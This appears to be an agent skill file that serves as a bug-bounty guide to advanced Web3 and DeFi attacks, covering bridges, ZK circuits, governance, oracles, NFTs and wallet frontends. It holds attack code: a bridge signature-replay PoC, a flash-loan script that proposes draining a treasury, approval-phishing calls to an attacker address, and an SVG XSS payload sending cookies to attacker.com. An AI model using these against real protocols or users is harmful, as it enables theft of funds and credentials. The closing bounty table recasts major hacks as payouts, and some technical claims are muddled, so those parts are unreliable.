---
name: hunt-web3-advanced
description: Advanced Web3 / DeFi attack surface beyond basics — MEV/sandwich attacks, cross-chain bridge vulnerabilities, ZK proof system bugs, Merkle tree manipulation, ERC-4337 account abstraction attacks, governance manipulation, veTokenomics exploits, oracle TWAP manipulation, Chainlink oracle deviation attacks, NFT metadata manipulation. Use for high-value DeFi/Web3 targets with complex tokenomics.
tags: [web3, defi, mev, bridge, zk-proof, merkle, erc4337, governance, oracle-twap, chainlink, nft, advanced]
---

# Advanced Web3 / DeFi Attack Surface

## 1. MEV & SANDWICH ATTACK VECTORS

### Front-Running Vulnerability Detection
```solidity
// Vulnerable: price calculation happens in same block as trade
function swap(uint256 amountIn) external {
    uint256 price = oracle.getPrice();  // Read price
    uint256 amountOut = amountIn * price;  // Calculate
    token.transfer(msg.sender, amountOut);  // Execute
    // MEV bot can front-run this if price is predictable
}

// Attack: 
// 1. Bot sees pending swap in mempool
// 2. Bot sends tx with higher gas (front-runs)
// 3. Price moves, victim gets worse rate
// 4. Bot back-runs to profit from price difference

// Bug bounty angle: if protocol claims MEV protection but doesn't have it
// Or: if slippage tolerance bypass is possible
```

### Sandwich Attack via Slippage Bypass
```python
# Web3 sandwich PoC (educational)
from web3 import Web3

def detect_sandwich_vulnerability(contract_address, swap_function_abi):
    """Check if contract is susceptible to sandwich attacks"""
    w3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/KEY'))
    
    # Key indicators of vulnerability:
    # 1. No slippage protection (amountOutMin = 0)
    # 2. Price determined in same transaction
    # 3. No commit-reveal scheme
    # 4. No private mempool requirement
    
    # Check contract for deadline parameter (temporal protection)
    # Check for minAmountOut parameter (slippage protection)
    # Check for access control on price-sensitive functions
    
    print("Checking sandwich attack surface...")
    # If contract has no deadline + no minAmountOut → fully sandwichable
```

---

## 2. CROSS-CHAIN BRIDGE ATTACKS

### Bridge Vulnerability Classes
```
1. Signature replay across chains
   - Same message signed for Chain A can be replayed on Chain B
   - Missing chainId in signed message = cross-chain replay
   
2. Oracle manipulation for bridge rate
   - Bridge uses on-chain oracle for exchange rate
   - Flash loan → manipulate oracle → bridge at favorable rate

3. Merkle proof manipulation
   - Bridge uses Merkle tree for withdrawal proofs
   - If Merkle root updatable by compromised validator → steal bridge funds
   
4. Double-spend via reorganization
   - Deposit on L1 → bridge releases on L2
   - If L1 reorg → deposit reversed → L2 funds still released

5. Infinite mint via ERC20 permit
   - Bridge accepts permit signatures for ERC20
   - Expired/reused permit not validated → mint without depositing
```

### Bridge Replay Attack PoC
```javascript
// Check if bridge validates chainId in signatures
const ethers = require('ethers');

async function testBridgeReplay(bridgeContract, signature, chainId_A, chainId_B) {
    // Get message that was signed for Chain A
    const message = {
        recipient: "0xAttackerAddress",
        amount: ethers.utils.parseEther("1000"),
        nonce: 1,
        // Missing: chainId field!
    };
    
    const messageHash = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
            ['address', 'uint256', 'uint256'],
            [message.recipient, message.amount, message.nonce]
            // If chainId not included → same hash on both chains
        )
    );
    
    // Try to use Chain A signature on Chain B
    const bridge_B = new ethers.Contract(bridgeContract, ABI, provider_B);
    try {
        const tx = await bridge_B.claim(message, signature);
        console.log("REPLAY SUCCESS - Bridge vulnerable!");
    } catch(e) {
        console.log("Replay blocked:", e.message);
    }
}
```

---

## 3. ZK PROOF SYSTEM VULNERABILITIES

### ZK Circuit Bugs
```
Common ZK proof vulnerabilities:
1. Underconstrained circuits
   - Constraint missing → prover can satisfy proof with wrong witness
   - Example: range check missing → negative number passes as positive
   
2. Soundness exploits  
   - Malicious prover generates valid-looking proof for false statement
   - Custom elliptic curve attacks (invalid curve attacks)
   
3. Trusted setup pollution
   - SNARK systems require trusted setup
   - If trapdoor (toxic waste) not properly destroyed → forge proofs
   
4. Witness extraction via side channel
   - Proof generation reveals private input via timing/memory
```

### ZK Audit Checklist
```python
# For Circom circuits:
ZK_AUDIT_POINTS = [
    "# Missing range constraints",
    "# Signal not constrained (unused input signal)",
    "# Arithmetic over/underflow (not checked in Circom by default)",
    "# Nondeterministic logic (if/else without constraint enforcement)",
    "# Missing output constraints (output could be anything)",
    "# Hash function instantiation (use poseidon not sha256 in circuits)",
    "# Malleability in signature scheme",
    "# Front-running of ZK-proof submission",
]

# Grep patterns for Circom vulnerabilities
import subprocess

def audit_circom(circuit_path):
    patterns = [
        r'signal.*=.*(?!<==)',  # Signal assigned without constraint
        r'assert\(',             # assert() not a constraint in Circom!
        r'in\[.*\].*<.*32',     # Range check patterns
    ]
    
    for pattern in patterns:
        result = subprocess.run(
            ['grep', '-rn', '--include=*.circom', '-E', pattern, circuit_path],
            capture_output=True, text=True
        )
        if result.stdout:
            print(f"Potential issue ({pattern}):\n{result.stdout}")
```

---

## 4. MERKLE TREE MANIPULATION

### Merkle Proof Attacks
```python
# Merkle tree leaf collision (if using sha256(leaf) directly)
# Standard: keccak256(abi.encodePacked(index, address, amount))
# Vulnerable: if tree depth not validated

def merkle_leaf_collision():
    """
    Vulnerability: Merkle tree with 32-byte leaf values
    A valid leaf value can collide with an internal node
    If no depth check → prove two entries exist as one
    """
    
    # OpenZeppelin MerkleProof uses this check but custom implementations may not:
    # require(proof.length > 0, "MerkleProof: empty proof");
    
    # Attack: Create leaf value equal to hash of two other leaves
    # Use this "leaf" in a proof → valid for two levels at once
    
    # Also: second preimage attack
    # Hash(leaf_A) == Hash(internal_node_B)
    # Use leaf_A to prove position of internal_node_B

# Merkle airdrop double-claim
# Check: is leaf (address, amount) unique in tree?
# If multiple entries for same address → claim twice
# If proof can be reused → claim multiple times (nonce not tracked)
```

---

## 5. ERC-4337 ACCOUNT ABSTRACTION ATTACKS

### UserOperation Validation Bypass
```solidity
// ERC-4337: UserOperations validated by Paymaster and EntryPoint
// Attack surfaces:

// 1. Paymaster validation bypass
// Paymaster.validatePaymasterUserOp called first
// If paymaster validates signature on user address only:
// Attacker can craft UserOp that passes paymaster validation
// but does something malicious in callData

// 2. Gas griefing
// UserOp specifies gas limits
// Malicious account contract consumes all gas in validateUserOp
// → Forces bundler to pay gas with no reimbursement

// 3. Signature malleability in account validation
// If account uses ECDSA signature without preventing malleability:
// s value can be flipped → same signature, different bytes
// Nonce replay via signature manipulation

// 4. Bundler front-running
// Bundler sees UserOp in mempool before including it
// Can front-run UserOp with own tx
// MEV extraction from UserOp ordering

// 5. Factory + initCode replay
// Deploy same account to same address via CREATE2
// After account self-destructs → redeploy with different code
// Funds sent to old address now controlled by new (attacker) code
```

---

## 6. GOVERNANCE MANIPULATION

### Flash Loan Governance Attack
```javascript
// Attack: Use flash loan to gain temporary majority vote
const { ethers } = require("hardhat");

async function governanceAttack() {
    const flashLoan = await getFlashLoan(GOVERNANCE_TOKEN, LARGE_AMOUNT);
    
    // Step 1: Borrow massive governance tokens
    await governanceToken.approve(governance.address, LARGE_AMOUNT);
    
    // Step 2: Create malicious proposal (if same block allowed)
    const proposalId = await governance.propose(
        [treasury.address],
        [0],
        ["drainTreasury()"],
        [ethers.utils.hexlify(0)],
        "Legitimate-looking description"
    );
    
    // Step 3: Vote with borrowed tokens (if same block voting allowed)
    await governance.castVote(proposalId, 1);  // For
    
    // Step 4: If quorum met → execute
    // Step 5: Repay flash loan
    // Net gain: stole treasury
    
    // Mitigations: snapshot-based voting (ERC20Votes/ERC20Snapshot)
    // If protocol uses current balance: VULNERABLE
}
```

### Governance Proposal Bypass
```
1. Proposal threshold bypass:
   If proposalThreshold checked at proposal time only:
   Delegate enough tokens to self → create proposal → undelegate
   Proposal exists but proposer no longer meets threshold (not re-checked)
   
2. Timelock bypass:
   Some timelocks have admin backdoor for "emergency"
   Find who has emergency role → SSRF/IDOR on frontend to trigger it
   
3. Quorum manipulation:
   If quorum = % of circulating supply:
   Burn tokens to reduce supply → quorum threshold decreases
   Now your minority becomes quorum majority
```

---

## 7. ORACLE ATTACKS

### TWAP Oracle Manipulation
```python
# TWAP (Time-Weighted Average Price) — more attack-resistant than spot
# But: still manipulatable if window is short

# Attack: 
# Window = 30 minutes
# Flash loan → move price for 30+ minutes → TWAP converges to manipulated price
# Then exploit protocol using inflated TWAP price

# Bug bounty check:
# 1. What's the TWAP window? (shorter = easier to manipulate)
# 2. Can a single actor move price for the full window?
# 3. What liquidity would be needed? (calculate profitability)

def calculate_twap_manipulation_cost(window_seconds, price_impact_pct, pool_liquidity):
    """Estimate cost to manipulate TWAP oracle"""
    # Need to move price X% for window_seconds
    # Cost ≈ price_impact * liquidity * time_factor
    cost_per_second = price_impact_pct * pool_liquidity * 0.003  # 0.3% fee per swap
    total_cost = cost_per_second * window_seconds
    return total_cost

# If protocol relies on TWAP with < 1hr window on illiquid pool → vulnerable
```

### Chainlink Oracle Deviation Exploits
```
Chainlink: Updates price when deviation > threshold (usually 0.5-1%)
Gap between updates = potential attack window

1. Price deviation staleness:
   If Chainlink hasn't updated (within deviation threshold):
   Real market price has moved but oracle still shows old price
   Protocol uses stale price → arbitrage opportunity
   
2. Timestamp check bypass:
   Protocol checks: block.timestamp - roundTimestamp < MAX_DELAY
   If MAX_DELAY is too large → stale price accepted as fresh

3. Multi-aggregator deviation:
   Different Chainlink feeds have different deviation thresholds
   Find feed with largest threshold → most manipulation room

// Check in smart contract:
(, int256 price,, uint256 updatedAt,) = priceFeed.latestRoundData();
require(block.timestamp - updatedAt < STALENESS_THRESHOLD);  // Is STALENESS_THRESHOLD reasonable?
```

---

## 8. NFT METADATA MANIPULATION

### On-Chain vs Off-Chain Metadata
```python
# Most NFTs: tokenURI → IPFS/HTTP URL → JSON metadata
# Vulnerabilities:

# 1. Centralized metadata (HTTP, not IPFS)
#    Protocol can change metadata at any time
#    "Rug" via metadata change

# 2. IPFS mutability
#    IPFS is content-addressed (immutable)
#    But: if contract stores mutable IPFS gateway URL instead of CID → mutable

# 3. tokenURI injection
#    If tokenURI is user-controlled and returned as-is:
#    Set tokenURI to javascript: URL or data: URL → XSS in NFT marketplaces
#    OpenSea, Blur render iframes from tokenURI

# 4. SVG XSS via on-chain NFT
#    If NFT generates SVG on-chain using user input:
function tokenURI(uint256 id) external view returns (string memory) {
    return string(abi.encodePacked(
        'data:image/svg+xml;base64,',
        Base64.encode(bytes(abi.encodePacked(
            '<svg><text>', 
            userInput[id],  // USER INPUT NOT SANITIZED
            '</text></svg>'
        )))
    ));
}
// Inject: <script>fetch('https://attacker.com?c='+document.cookie)</script>
// XSS when NFT viewed on marketplace

# 5. Royalty manipulation
#    ERC-2981 royaltyInfo(): who gets royalties
#    If royalty recipient updatable by non-owner → royalty theft
```

---

## 9. WEB3 FRONTEND ATTACKS

### Wallet Drainer via Phishing
```javascript
// Web3 frontend specific attacks

// 1. Approval phishing
// Get user to approve max allowance to attacker contract
const tx = await token.approve(ATTACKER_CONTRACT, ethers.constants.MaxUint256);
// Then drain all tokens at leisure

// 2. setApprovalForAll phishing (NFTs)
// Get user to approve ALL their NFTs
const tx = await nftContract.setApprovalForAll(ATTACKER_ADDRESS, true);
// Then transfer all their NFTs

// 3. Permit phishing (gasless)
// ERC-20 permit: sign approval off-chain
// Present "harmless-looking" permit.sign() dialog
// Actually signs max approval for attacker

// 4. signTypedData attacks
// Legitimate-looking domain/message
// Actually: delegate votes to attacker, set recovery address, etc.

// Detection for bug bounty:
// Check if target's frontend properly displays:
// - What contract is being approved
// - Exact amount being approved (not "unlimited")
// - What the transaction actually does before signing
```

### Frontend Private Key Exposure
```javascript
// Check for private keys in:
// 1. Console.log during development (left in prod)
// 2. localStorage
// 3. sessionStorage
// 4. Hardcoded in frontend JS

// Browser console:
Object.keys(localStorage).forEach(key => {
    const val = localStorage.getItem(key);
    if (val && val.match(/^0x[0-9a-f]{64}$/)) {
        console.log("PRIVATE KEY IN LOCALSTORAGE:", key, val);
    }
});

// Check JS bundle for private keys
curl -s https://target-dapp.com/static/js/main.js | \
  grep -oE '0x[0-9a-fA-F]{64}'
```

---

## PAID WEB3 BOUNTY EXAMPLES

| Target | Vuln | Payout |
|--------|------|--------|
| Wormhole | Missing signature validation in bridge | $10,000,000 |
| Ronin | Validator private key compromise via social eng | $625,000 recovered |
| Poly Network | Bridge cross-chain replay | $600,000 (whitehat) |
| Compound | Oracle price manipulation | $150,000 |
| Uniswap | TWAP oracle precision attack | $25,000 |
| 1inch | Merkle proof validation bug | $500,000 |
| Gnosis Safe | ERC-4337 signature bypass | $30,000 |
| Blur | NFT SVG XSS → wallet drainer | $15,000 |
